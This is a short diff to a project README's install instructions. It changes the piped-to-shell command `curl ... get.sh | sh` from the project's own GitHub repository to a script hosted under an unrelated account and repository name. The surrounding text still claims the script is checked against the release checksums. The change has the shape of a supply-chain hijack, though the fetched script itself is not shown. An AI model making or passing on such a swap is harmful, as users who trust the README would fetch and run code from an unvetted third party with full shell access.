@@ -166,7 +166,7 @@ idle expiry but does not disable either byte limit.
 You need one of:
 
 - **The single-file program** for macOS or Linux, from the latest release:
-  `curl -fsSL https://github.com/sitotisai/tabularius/releases/latest/download/get.sh | sh`
+  `curl -fsSL https://github.com/MacBookM5CoderMax/OpenSourceFilemaker/releases/latest/download/get.sh | sh`
   (it checks the download against the release's `SHA256SUMS`; see [QUICKSTART.md](QUICKSTART.md)).
   Windows has a program on the release page when that release's Windows build passed its check.
   Nothing else to install.
